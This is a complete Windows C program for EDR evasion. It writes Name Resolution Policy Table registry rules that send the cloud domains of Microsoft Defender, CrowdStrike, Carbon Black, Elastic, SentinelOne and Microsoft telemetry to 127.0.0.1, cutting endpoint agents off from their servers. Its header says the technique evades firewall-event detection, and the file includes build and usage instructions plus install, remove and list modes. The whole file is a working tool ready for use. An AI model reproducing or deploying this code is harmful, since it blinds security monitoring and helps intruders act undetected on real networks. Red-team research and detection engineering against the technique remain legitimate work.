/*
 * 05_nrpt_sinkhole.c
 * DNS Sinkholing via NRPT (Name Resolution Policy Table)
 *
 * Adds registry entries under DnsPolicyConfig that instruct the Windows
 * DNS client to resolve specified namespaces via 127.0.0.1 (loopback),
 * causing connection failures for EDR cloud domains.
 *
 * Supports wildcard namespaces (.example.com catches ALL subdomains).
 * Operates completely independently of WFP — no Event 5447.
 *
 * Build:
 *   cl 05_nrpt_sinkhole.c /link Advapi32.lib rpcrt4.lib
 *
 * Usage:
 *   05_nrpt_sinkhole.exe install
 *   05_nrpt_sinkhole.exe install .custom-domain.com .other-domain.com
 *   05_nrpt_sinkhole.exe remove
 *   05_nrpt_sinkhole.exe list
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <rpc.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "rpcrt4.lib")

#define NRPT_BASE  L"SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters\\DnsPolicyConfig"
#define SINKHOLE_IP L"127.0.0.1"
#define MARKER_NAME L"__nrpt_edr__"

/* EDR cloud domains to sinkhole (wildcard namespaces with leading dot) */
static const WCHAR *EDR_DOMAINS[] = {
    /* Microsoft Defender for Endpoint */
    L".endpoint.security.microsoft.com",
    L"endpoint.security.microsoft.com",
    L".events.data.microsoft.com",
    L".vortex-win.data.microsoft.com",
    L".settings-win.data.microsoft.com",
    L".oms.opinsights.azure.com",
    L".azure-automation.net",
    /* CrowdStrike */
    L".cloudsink.net",
    L".crowdstrike.com",
    /* Carbon Black */
    L".carbonblack.io",
    L".confer.net",
    /* Elastic */
    L".elastic.co",
    L".elastic-cloud.com",
    /* SentinelOne */
    L".sentinelone.net",
    /* Generic telemetry */
    L".telemetry.microsoft.com",
    NULL
};

static BOOL GenGuidString(WCHAR *out, DWORD len)
{
    UUID uuid;
    UuidCreate(&uuid);
    WCHAR *str = NULL;
    UuidToStringW(&uuid, (RPC_WSTR *)&str);
    _snwprintf_s(out, len, _TRUNCATE, L"{%s}", str);
    RpcStringFreeW((RPC_WSTR *)&str);
    return TRUE;
}

/*
 * Create one NRPT rule:
 *   Namespace .foo.com → DNS server 127.0.0.1
 *
 * Registry key structure:
 *   HKLM\...\DnsPolicyConfig\{GUID}
 *     DAFDisabled        REG_DWORD  = 0
 *     ConfigOptions      REG_DWORD  = 0x00000008   (generic DNS servers configured)
 *     Name               REG_SZ     = ".namespace.com"
 *     GenericDNSServers  REG_SZ     = "127.0.0.1"
 *     Version            REG_DWORD  = 2
 *     __marker           REG_SZ     = MARKER_NAME
 */
static BOOL AddNrptRule(const WCHAR *namespace_)
{
    WCHAR guidStr[64] = {0};
    GenGuidString(guidStr, ARRAYSIZE(guidStr));

    WCHAR keyPath[512] = {0};
    _snwprintf_s(keyPath, ARRAYSIZE(keyPath), _TRUNCATE,
                 L"%s\\%s", NRPT_BASE, guidStr);

    HKEY hKey = NULL;
    DWORD disp = 0;
    LONG err = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE, keyPath,
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, &disp
    );
    if (err != ERROR_SUCCESS) {
        wprintf(L"  [-] RegCreateKeyExW failed: %ld\n", err);
        return FALSE;
    }

    DWORD configOptions = 0x00000008; /* GenericDNSServers flag */
    DWORD version       = 2;
    DWORD dafDisabled   = 0;

    /* Namespace to redirect */
    RegSetValueExW(hKey, L"Name", 0, REG_SZ,
                   (BYTE *)namespace_, (DWORD)((wcslen(namespace_)+1)*sizeof(WCHAR)));

    /* Sinkhole DNS server address */
    RegSetValueExW(hKey, L"GenericDNSServers", 0, REG_SZ,
                   (BYTE *)SINKHOLE_IP, (DWORD)((wcslen(SINKHOLE_IP)+1)*sizeof(WCHAR)));

    RegSetValueExW(hKey, L"ConfigOptions", 0, REG_DWORD,
                   (BYTE *)&configOptions, sizeof(configOptions));
    RegSetValueExW(hKey, L"Version", 0, REG_DWORD,
                   (BYTE *)&version, sizeof(version));
    RegSetValueExW(hKey, L"DAFDisabled", 0, REG_DWORD,
                   (BYTE *)&dafDisabled, sizeof(dafDisabled));

    /* Sentinel for cleanup */
    RegSetValueExW(hKey, MARKER_NAME, 0, REG_SZ,
                   (BYTE *)L"1", sizeof(WCHAR)*2);

    RegCloseKey(hKey);
    wprintf(L"  [+] NRPT rule: %-50s → %s  [%s]\n",
            namespace_, SINKHOLE_IP, guidStr);
    return TRUE;
}

static void RemoveAllRules(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NRPT_BASE, 0,
                      KEY_READ | KEY_WRITE, &hBase) != ERROR_SUCCESS)
    {
        wprintf(L"[-] Cannot open DnsPolicyConfig key\n");
        return;
    }

    WCHAR subName[64];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;

    WCHAR toDelete[512][64];
    DWORD deleteCount = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                         NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        HKEY hSub = NULL;
        if (RegOpenKeyExW(hBase, subName, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            DWORD type = 0;
            DWORD dataSize = 4;
            BYTE  data[4] = {0};
            if (RegQueryValueExW(hSub, MARKER_NAME, NULL, &type,
                                 data, &dataSize) == ERROR_SUCCESS)
            {
                wcscpy_s(toDelete[deleteCount], 64, subName);
                deleteCount++;
            }
            RegCloseKey(hSub);
        }
        idx++;
        subLen = ARRAYSIZE(subName);
    }

    UINT32 removed = 0;
    for (DWORD i = 0; i < deleteCount; i++) {
        if (RegDeleteKeyW(hBase, toDelete[i]) == ERROR_SUCCESS) {
            removed++;
            wprintf(L"  [+] Deleted NRPT rule: %s\n", toDelete[i]);
        }
    }
    RegCloseKey(hBase);

    /* Flush DNS cache */
    system("ipconfig /flushdns > nul 2>&1");

    wprintf(L"\n[+] Removed %u NRPT rule(s) and flushed DNS cache\n", removed);
}

static void ListRules(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NRPT_BASE, 0,
                      KEY_READ, &hBase) != ERROR_SUCCESS)
    {
        wprintf(L"[-] No NRPT rules found\n");
        return;
    }

    wprintf(L"%-50s  %-15s  %s\n", L"Namespace", L"DNS Server", L"KeyGUID");
    wprintf(L"%-50s  %-15s  %s\n",
            L"--------------------------------------------------",
            L"---------------",
            L"------------------------------------");

    WCHAR subName[64];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                         NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        HKEY hSub = NULL;
        if (RegOpenKeyExW(hBase, subName, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            WCHAR ns[256] = {0};
            DWORD nsLen   = sizeof(ns);
            WCHAR dns[64] = {0};
            DWORD dnsLen  = sizeof(dns);

            RegQueryValueExW(hSub, L"Name",             NULL, NULL, (BYTE *)ns,  &nsLen);
            RegQueryValueExW(hSub, L"GenericDNSServers", NULL, NULL, (BYTE *)dns, &dnsLen);

            wprintf(L"%-50s  %-15s  %s\n", ns, dns, subName);
            RegCloseKey(hSub);
        }
        idx++;
        subLen = ARRAYSIZE(subName);
    }
    RegCloseKey(hBase);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] NRPT Sinkhole Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s install                        Install rules for all EDR domains\n", argv[0]);
        wprintf(L"  %s install .foo.com .bar.com ...  Install for specific domains\n", argv[0]);
        wprintf(L"  %s remove                         Remove all installed rules\n", argv[0]);
        wprintf(L"  %s list                           List all NRPT rules\n", argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"list") == 0) {
        ListRules();
        return 0;
    }

    if (_wcsicmp(argv[1], L"remove") == 0) {
        RemoveAllRules();
        return 0;
    }

    if (_wcsicmp(argv[1], L"install") == 0) {
        if (argc >= 3) {
            /* Specific domains on command line */
            for (int i = 2; i < argc; i++) {
                AddNrptRule(argv[i]);
            }
        } else {
            /* Use hardcoded EDR domain list */
            for (int i = 0; EDR_DOMAINS[i] != NULL; i++) {
                AddNrptRule(EDR_DOMAINS[i]);
            }
        }

        /* Flush DNS cache */
        system("ipconfig /flushdns > nul 2>&1");
        wprintf(L"\n[*] DNS cache flushed.\n");
        wprintf(L"[*] NRPT rules are active for new DNS queries.\n");
        wprintf(L"[*] Note: cached IPs in EDR process may persist until TTL expires.\n");
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
